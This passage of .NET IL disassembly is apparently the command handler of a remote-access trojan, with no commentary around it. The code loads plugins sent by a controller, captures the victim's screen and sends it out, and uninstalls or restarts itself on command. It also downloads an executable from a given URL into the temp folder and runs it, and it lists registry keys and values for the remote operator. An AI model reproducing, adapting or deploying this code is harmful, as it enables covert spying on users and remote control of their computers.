      IL_0f63:  ldloc.s    V_60
      IL_0f65:  ldc.i4.1
      IL_0f66:  ldsfld     string ClassLibrary1.OK::Y
      IL_0f6b:  stelem.ref
      IL_0f6c:  ldloc.s    V_60
      IL_0f6e:  ldc.i4.2
      IL_0f6f:  ldloc.0
      IL_0f70:  ldc.i4.1
      IL_0f71:  ldelem.ref
      IL_0f72:  stelem.ref
      IL_0f73:  ldloc.s    V_60
      IL_0f75:  ldc.i4.3
      IL_0f76:  ldsfld     string ClassLibrary1.OK::Y
      IL_0f7b:  stelem.ref
      IL_0f7c:  ldloc.s    V_60
      IL_0f7e:  ldc.i4.4
      IL_0f7f:  ldc.i4.0
      IL_0f80:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0f85:  stelem.ref
      IL_0f86:  ldloc.s    V_60
      IL_0f88:  call       string [mscorlib]System.String::Concat(string[])
      IL_0f8d:  call       bool ClassLibrary1.OK::Send(string)
      IL_0f92:  pop
      IL_0f93:  br         IL_1053

      IL_0f98:  ldloc.0
      IL_0f99:  ldc.i4.2
      IL_0f9a:  ldelem.ref
      IL_0f9b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0fa0:  ldc.i4.1
      IL_0fa1:  bne.un.s   IL_0fe8

      IL_0fa3:  ldc.i4.5
      IL_0fa4:  newarr     [mscorlib]System.String
      IL_0fa9:  stloc.s    V_60
      IL_0fab:  ldloc.s    V_60
      IL_0fad:  ldc.i4.0
      IL_0fae:  ldstr      "pl"
      IL_0fb3:  stelem.ref
      IL_0fb4:  ldloc.s    V_60
      IL_0fb6:  ldc.i4.1
      IL_0fb7:  ldsfld     string ClassLibrary1.OK::Y
      IL_0fbc:  stelem.ref
      IL_0fbd:  ldloc.s    V_60
      IL_0fbf:  ldc.i4.2
      IL_0fc0:  ldloc.0
      IL_0fc1:  ldc.i4.1
      IL_0fc2:  ldelem.ref
      IL_0fc3:  stelem.ref
      IL_0fc4:  ldloc.s    V_60
      IL_0fc6:  ldc.i4.3
      IL_0fc7:  ldsfld     string ClassLibrary1.OK::Y
      IL_0fcc:  stelem.ref
      IL_0fcd:  ldloc.s    V_60
      IL_0fcf:  ldc.i4.4
      IL_0fd0:  ldstr      "True"
      IL_0fd5:  stelem.ref
      IL_0fd6:  ldloc.s    V_60
      IL_0fd8:  call       string [mscorlib]System.String::Concat(string[])
      IL_0fdd:  call       bool ClassLibrary1.OK::Send(string)
      IL_0fe2:  pop
      IL_0fe3:  leave      IL_16cc

      IL_0fe8:  ldloc.0
      IL_0fe9:  ldc.i4.2
      IL_0fea:  ldelem.ref
      IL_0feb:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0ff0:  ldc.i4.0
      IL_0ff1:  stloc.s    V_71
      IL_0ff3:  ldloca.s   V_71
      IL_0ff5:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                         bool&)
      IL_0ffa:  stloc.s    V_36
      IL_0ffc:  ldloc.0
      IL_0ffd:  ldc.i4.1
      IL_0ffe:  ldelem.ref
      IL_0fff:  ldloc.s    V_36
      IL_1001:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
      IL_1006:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_100b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1010:  brfalse.s  IL_1053

      IL_1012:  ldc.i4.5
      IL_1013:  newarr     [mscorlib]System.String
      IL_1018:  stloc.s    V_60
      IL_101a:  ldloc.s    V_60
      IL_101c:  ldc.i4.0
      IL_101d:  ldstr      "pl"
      IL_1022:  stelem.ref
      IL_1023:  ldloc.s    V_60
      IL_1025:  ldc.i4.1
      IL_1026:  ldsfld     string ClassLibrary1.OK::Y
      IL_102b:  stelem.ref
      IL_102c:  ldloc.s    V_60
      IL_102e:  ldc.i4.2
      IL_102f:  ldloc.0
      IL_1030:  ldc.i4.1
      IL_1031:  ldelem.ref
      IL_1032:  stelem.ref
      IL_1033:  ldloc.s    V_60
      IL_1035:  ldc.i4.3
      IL_1036:  ldsfld     string ClassLibrary1.OK::Y
      IL_103b:  stelem.ref
      IL_103c:  ldloc.s    V_60
      IL_103e:  ldc.i4.4
      IL_103f:  ldc.i4.0
      IL_1040:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1045:  stelem.ref
      IL_1046:  ldloc.s    V_60
      IL_1048:  call       string [mscorlib]System.String::Concat(string[])
      IL_104d:  call       bool ClassLibrary1.OK::Send(string)
      IL_1052:  pop
      IL_1053:  ldloc.s    V_36
      IL_1055:  ldstr      "A"
      IL_105a:  call       object ClassLibrary1.OK::Plugin(uint8[],
                                                           string)
      IL_105f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1064:  stloc.s    V_37
      IL_1066:  ldc.i4.5
      IL_1067:  newarr     [mscorlib]System.String
      IL_106c:  stloc.s    V_60
      IL_106e:  ldloc.s    V_60
      IL_1070:  ldc.i4.0
      IL_1071:  ldstr      "ret"
      IL_1076:  stelem.ref
      IL_1077:  ldloc.s    V_60
      IL_1079:  ldc.i4.1
      IL_107a:  ldsfld     string ClassLibrary1.OK::Y
      IL_107f:  stelem.ref
      IL_1080:  ldloc.s    V_60
      IL_1082:  ldc.i4.2
      IL_1083:  ldloc.0
      IL_1084:  ldc.i4.1
      IL_1085:  ldelem.ref
      IL_1086:  stelem.ref
      IL_1087:  ldloc.s    V_60
      IL_1089:  ldc.i4.3
      IL_108a:  ldsfld     string ClassLibrary1.OK::Y
      IL_108f:  stelem.ref
      IL_1090:  ldloc.s    V_60
      IL_1092:  ldc.i4.4
      IL_1093:  ldloc.s    V_37
      IL_1095:  ldnull
      IL_1096:  ldstr      "GT"
      IL_109b:  ldc.i4.0
      IL_109c:  newarr     [mscorlib]System.Object
      IL_10a1:  ldnull
      IL_10a2:  ldnull
      IL_10a3:  ldnull
      IL_10a4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_10a9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_10ae:  stloc.s    V_69
      IL_10b0:  ldloca.s   V_69
      IL_10b2:  call       string ClassLibrary1.OK::ENB(string&)
      IL_10b7:  stelem.ref
      IL_10b8:  ldloc.s    V_60
      IL_10ba:  call       string [mscorlib]System.String::Concat(string[])
      IL_10bf:  call       bool ClassLibrary1.OK::Send(string)
      IL_10c4:  pop
      IL_10c5:  leave      IL_16cc

      IL_10ca:  ldloc.s    V_58
      IL_10cc:  ldstr      "CAP"
      IL_10d1:  ldc.i4.0
      IL_10d2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10d7:  ldc.i4.0
      IL_10d8:  bne.un     IL_1240

      IL_10dd:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_10e2:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_10e7:  stloc.s    V_80
      IL_10e9:  ldloca.s   V_80
      IL_10eb:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_10f0:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_10f5:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_10fa:  stloc.s    V_81
      IL_10fc:  ldloca.s   V_81
      IL_10fe:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1103:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_1108:  stloc.s    V_43
      IL_110a:  ldloc.s    V_43
      IL_110c:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1111:  stloc.s    V_39
      IL_1113:  ldloc.s    V_39
      IL_1115:  ldc.i4.0
      IL_1116:  ldc.i4.0
      IL_1117:  ldc.i4.0
      IL_1118:  ldc.i4.0
      IL_1119:  ldloca.s   V_82
      IL_111b:  ldloc.s    V_43
      IL_111d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_1122:  ldloc.s    V_43
      IL_1124:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1129:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_112e:  ldloc.s    V_82
      IL_1130:  ldc.i4     0xcc0020
      IL_1135:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_113a:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_113f:  ldloc.s    V_39
        IL_1141:  ldloca.s   V_81
        IL_1143:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_1148:  ldloca.s   V_82
        IL_114a:  ldc.i4.s   32
        IL_114c:  ldc.i4.s   32
        IL_114e:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_1153:  ldloc.s    V_82
        IL_1155:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_115a:  ldloc.s    V_81
        IL_115c:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1161:  leave.s    IL_1172

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1163:  dup
        IL_1164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1169:  stloc.s    V_44
        IL_116b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1170:  leave.s    IL_1172

      }  // end handler
      IL_1172:  ldloc.s    V_39
      IL_1174:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1179:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_117e:  stloc.s    V_41
      IL_1180:  ldstr      "CAP"
      IL_1185:  ldsfld     string ClassLibrary1.OK::Y
      IL_118a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_118f:  stloc.s    V_69
      IL_1191:  ldloca.s   V_69
      IL_1193:  call       uint8[] ClassLibrary1.OK::SB(string&)
      IL_1198:  starg.s    b
      IL_119a:  ldloc.s    V_41
      IL_119c:  ldarg.0
      IL_119d:  ldc.i4.0
      IL_119e:  ldarg.0
      IL_119f:  ldlen
      IL_11a0:  conv.ovf.i4
      IL_11a1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_11a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_11ab:  stloc.s    V_42
      IL_11ad:  ldloc.s    V_43
      IL_11af:  ldloc.0
      IL_11b0:  ldc.i4.1
      IL_11b1:  ldelem.ref
      IL_11b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_11b7:  ldloc.0
      IL_11b8:  ldc.i4.2
      IL_11b9:  ldelem.ref
      IL_11ba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_11bf:  ldnull
      IL_11c0:  ldloc.s    V_83
      IL_11c2:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                       int32,
                                                                                                                                       class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                       native int)
      IL_11c7:  ldloc.s    V_42
      IL_11c9:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_11ce:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_11d3:  ldloc.s    V_42
      IL_11d5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_11da:  call       string ClassLibrary1.OK::getMD5Hash(uint8[])
      IL_11df:  stloc.s    V_40
      IL_11e1:  ldloc.s    V_40
      IL_11e3:  ldsfld     string ClassLibrary1.OK::lastcap
      IL_11e8:  ldc.i4.0
      IL_11e9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11ee:  ldc.i4.0
      IL_11ef:  beq.s      IL_1211

      IL_11f1:  ldloc.s    V_40
      IL_11f3:  stsfld     string ClassLibrary1.OK::lastcap
      IL_11f8:  ldloc.s    V_41
      IL_11fa:  ldloc.s    V_42
      IL_11fc:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1201:  ldc.i4.0
      IL_1202:  ldloc.s    V_42
      IL_1204:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_1209:  conv.ovf.i4
      IL_120a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_120f:  br.s       IL_1219

      IL_1211:  ldloc.s    V_41
      IL_1213:  ldc.i4.0
      IL_1214:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_1219:  ldloc.s    V_41
      IL_121b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1220:  call       bool ClassLibrary1.OK::Sendb(uint8[])
      IL_1225:  pop
      IL_1226:  ldloc.s    V_41
      IL_1228:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_122d:  ldloc.s    V_42
      IL_122f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_1234:  ldloc.s    V_43
      IL_1236:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_123b:  leave      IL_16cc

      IL_1240:  ldloc.s    V_58
      IL_1242:  ldstr      "P"
      IL_1247:  ldc.i4.0
      IL_1248:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_124d:  ldc.i4.0
      IL_124e:  bne.un.s   IL_1260

      IL_1250:  ldstr      "P"
      IL_1255:  call       bool ClassLibrary1.OK::Send(string)
      IL_125a:  pop
      IL_125b:  leave      IL_16cc

      IL_1260:  ldloc.s    V_58
      IL_1262:  ldstr      "un"
      IL_1267:  ldc.i4.0
      IL_1268:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_126d:  ldc.i4.0
      IL_126e:  bne.un.s   IL_12e2

      IL_1270:  ldloc.0
      IL_1271:  ldc.i4.1
      IL_1272:  ldelem.ref
      IL_1273:  stloc.s    V_84
      IL_1275:  ldloc.s    V_84
      IL_1277:  ldstr      "~"
      IL_127c:  ldc.i4.0
      IL_127d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1282:  ldc.i4.0
      IL_1283:  bne.un.s   IL_128f

      IL_1285:  call       void ClassLibrary1.OK::UNS()
      IL_128a:  leave      IL_16cc

      IL_128f:  ldloc.s    V_84
      IL_1291:  ldstr      "!"
      IL_1296:  ldc.i4.0
      IL_1297:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_129c:  ldc.i4.0
      IL_129d:  bne.un.s   IL_12af

      IL_129f:  ldc.i4.0
      IL_12a0:  call       void ClassLibrary1.OK::pr(int32)
      IL_12a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_12aa:  leave      IL_16cc

      IL_12af:  ldloc.s    V_84
      IL_12b1:  ldstr      "@"
      IL_12b6:  ldc.i4.0
      IL_12b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12bc:  ldc.i4.0
      IL_12bd:  bne.un     IL_1668

      IL_12c2:  ldc.i4.0
      IL_12c3:  call       void ClassLibrary1.OK::pr(int32)
      IL_12c8:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_12cd:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_12d2:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_12d7:  pop
      IL_12d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_12dd:  leave      IL_16cc

      IL_12e2:  ldloc.s    V_58
      IL_12e4:  ldstr      "up"
      IL_12e9:  ldc.i4.0
      IL_12ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12ef:  ldc.i4.0
      IL_12f0:  bne.un     IL_1491

      IL_12f5:  ldnull
      IL_12f6:  stloc.s    V_45
      IL_12f8:  ldloc.0
      IL_12f9:  ldc.i4.1
      IL_12fa:  ldelem.ref
      IL_12fb:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_1300:  ldstr      "http"
      IL_1305:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_130a:  brtrue.s   IL_135c

      .try
      {
        IL_130c:  ldloc.0
        IL_130d:  ldc.i4.1
        IL_130e:  ldelem.ref
        IL_130f:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_1314:  ldc.i4.0
        IL_1315:  stloc.s    V_71
        IL_1317:  ldloca.s   V_71
        IL_1319:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                           bool&)
        IL_131e:  stloc.s    V_45
        IL_1320:  leave      IL_13a8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1325:  dup
        IL_1326:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_132b:  stloc.s    V_47
        IL_132d:  ldstr      "MSG"
        IL_1332:  ldsfld     string ClassLibrary1.OK::Y
        IL_1337:  ldstr      "Update ERROR"
        IL_133c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1341:  call       bool ClassLibrary1.OK::Send(string)
        IL_1346:  pop
        IL_1347:  ldstr      "bla"
        IL_134c:  call       bool ClassLibrary1.OK::Send(string)
        IL_1351:  pop
        IL_1352:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1357:  leave      IL_16cc

      }  // end handler
      IL_135c:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_1361:  stloc.s    V_48
      .try
      {
        IL_1363:  ldloc.s    V_48
        IL_1365:  ldloc.0
        IL_1366:  ldc.i4.1
        IL_1367:  ldelem.ref
        IL_1368:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_136d:  stloc.s    V_45
        IL_136f:  leave.s    IL_13a8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1371:  dup
        IL_1372:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1377:  stloc.s    V_49
        IL_1379:  ldstr      "MSG"
        IL_137e:  ldsfld     string ClassLibrary1.OK::Y
        IL_1383:  ldstr      "Update ERROR"
        IL_1388:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_138d:  call       bool ClassLibrary1.OK::Send(string)
        IL_1392:  pop
        IL_1393:  ldstr      "bla"
        IL_1398:  call       bool ClassLibrary1.OK::Send(string)
        IL_139d:  pop
        IL_139e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_13a3:  leave      IL_16cc

      }  // end handler
      IL_13a8:  ldstr      "bla"
      IL_13ad:  call       bool ClassLibrary1.OK::Send(string)
      IL_13b2:  pop
      IL_13b3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_13b8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_13bd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_13c2:  ldstr      "di"
      IL_13c7:  ldstr      ""
      IL_13cc:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_13d1:  ldstr      "temp"
      IL_13d6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_13db:  ldstr      "\\"
      IL_13e0:  ldc.i4.s   10
      IL_13e2:  call       string ClassLibrary1.OK::RN(int32)
      IL_13e7:  ldstr      ".exe"
      IL_13ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_13f1:  stloc.s    V_46
      IL_13f3:  ldloc.s    V_46
      IL_13f5:  ldloc.s    V_45
      IL_13f7:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_13fc:  ldstr      "MSG"
      IL_1401:  ldsfld     string ClassLibrary1.OK::Y
      IL_1406:  ldstr      "Updating To "
      IL_140b:  ldloc.s    V_46
      IL_140d:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_1412:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_1417:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_141c:  call       bool ClassLibrary1.OK::Send(string)
      IL_1421:  pop
      IL_1422:  ldloc.s    V_46
      IL_1424:  ldstr      "UP:"
      IL_1429:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_142e:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_1433:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1438:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_143d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_1442:  pop
      IL_1443:  ldc.i4.0
      IL_1444:  stloc.s    V_50
      IL_1446:  ldc.i4.s   10
      IL_1448:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_144d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_1452:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_1457:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_145c:  ldstr      "di"
      IL_1461:  ldstr      ""
      IL_1466:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_146b:  ldstr      "!"
      IL_1470:  ldc.i4.0
      IL_1471:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_1476:  brfalse.s  IL_147d

      IL_1478:  call       void ClassLibrary1.OK::UNS()
      IL_147d:  ldloc.s    V_50
      IL_147f:  ldc.i4.1
      IL_1480:  add.ovf
      IL_1481:  stloc.s    V_50
      IL_1483:  ldloc.s    V_50
      IL_1485:  ldc.i4     0x1f4
      IL_148a:  ble.s      IL_1446

      IL_148c:  leave      IL_16cc

      IL_1491:  ldloc.s    V_58
      IL_1493:  ldstr      "RG"
      IL_1498:  ldc.i4.0
      IL_1499:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_149e:  ldc.i4.0
      IL_149f:  bne.un     IL_1668

      IL_14a4:  ldloc.0
      IL_14a5:  ldc.i4.2
      IL_14a6:  ldelem.ref
      IL_14a7:  call       class [mscorlib]Microsoft.Win32.RegistryKey ClassLibrary1.OK::GetKey(string)
      IL_14ac:  stloc.s    V_51
      IL_14ae:  ldloc.0
      IL_14af:  ldc.i4.1
      IL_14b0:  ldelem.ref
      IL_14b1:  stloc.s    V_85
      IL_14b3:  ldloc.s    V_85
      IL_14b5:  ldstr      "~"
      IL_14ba:  ldc.i4.0
      IL_14bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14c0:  ldc.i4.0
      IL_14c1:  bne.un     IL_15ed

      IL_14c6:  ldc.i4.6
      IL_14c7:  newarr     [mscorlib]System.String
      IL_14cc:  stloc.s    V_60
      IL_14ce:  ldloc.s    V_60
      IL_14d0:  ldc.i4.0
      IL_14d1:  ldstr      "RG"
      IL_14d6:  stelem.ref
      IL_14d7:  ldloc.s    V_60
      IL_14d9:  ldc.i4.1
      IL_14da:  ldsfld     string ClassLibrary1.OK::Y
      IL_14df:  stelem.ref
      IL_14e0:  ldloc.s    V_60
      IL_14e2:  ldc.i4.2
      IL_14e3:  ldstr      "~"
      IL_14e8:  stelem.ref
      IL_14e9:  ldloc.s    V_60
      IL_14eb:  ldc.i4.3
      IL_14ec:  ldsfld     string ClassLibrary1.OK::Y
      IL_14f1:  stelem.ref
      IL_14f2:  ldloc.s    V_60
      IL_14f4:  ldc.i4.4
      IL_14f5:  ldloc.0
      IL_14f6:  ldc.i4.2
      IL_14f7:  ldelem.ref
      IL_14f8:  stelem.ref
      IL_14f9:  ldloc.s    V_60
      IL_14fb:  ldc.i4.5
      IL_14fc:  ldsfld     string ClassLibrary1.OK::Y
      IL_1501:  stelem.ref
      IL_1502:  ldloc.s    V_60
      IL_1504:  call       string [mscorlib]System.String::Concat(string[])
      IL_1509:  stloc.s    V_53
      IL_150b:  ldstr      ""
      IL_1510:  stloc.s    V_52
      IL_1512:  ldloc.s    V_51
      IL_1514:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetSubKeyNames()
      IL_1519:  stloc.s    V_87
      IL_151b:  ldc.i4.0
      IL_151c:  stloc.s    V_86
      IL_151e:  br.s       IL_154b

      IL_1520:  ldloc.s    V_87
      IL_1522:  ldloc.s    V_86
      IL_1524:  ldelem.ref
      IL_1525:  stloc.s    V_54
      IL_1527:  ldloc.s    V_54
      IL_1529:  ldstr      "\\"
      IL_152e:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_1533:  brtrue.s   IL_1545

      IL_1535:  ldloc.s    V_52
      IL_1537:  ldloc.s    V_54
      IL_1539:  ldsfld     string ClassLibrary1.OK::Y
      IL_153e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1543:  stloc.s    V_52
      IL_1545:  ldloc.s    V_86
      IL_1547:  ldc.i4.1
      IL_1548:  add.ovf
      IL_1549:  stloc.s    V_86
      IL_154b:  ldloc.s    V_86
      IL_154d:  ldloc.s    V_87
      IL_154f:  ldlen
      IL_1550:  conv.ovf.i4
      IL_1551:  blt.s      IL_1520

      IL_1553:  ldloc.s    V_51
      IL_1555:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_155a:  stloc.s    V_89
      IL_155c:  ldc.i4.0
      IL_155d:  stloc.s    V_88
      IL_155f:  br.s       IL_15d4

      IL_1561:  ldloc.s    V_89
      IL_1563:  ldloc.s    V_88
      IL_1565:  ldelem.ref
      IL_1566:  stloc.s    V_55
      IL_1568:  ldc.i4.7
      IL_1569:  newarr     [mscorlib]System.String
      IL_156e:  stloc.s    V_60
      IL_1570:  ldloc.s    V_60
      IL_1572:  ldc.i4.0
      IL_1573:  ldloc.s    V_52
      IL_1575:  stelem.ref
      IL_1576:  ldloc.s    V_60
      IL_1578:  ldc.i4.1
      IL_1579:  ldloc.s    V_55
      IL_157b:  stelem.ref
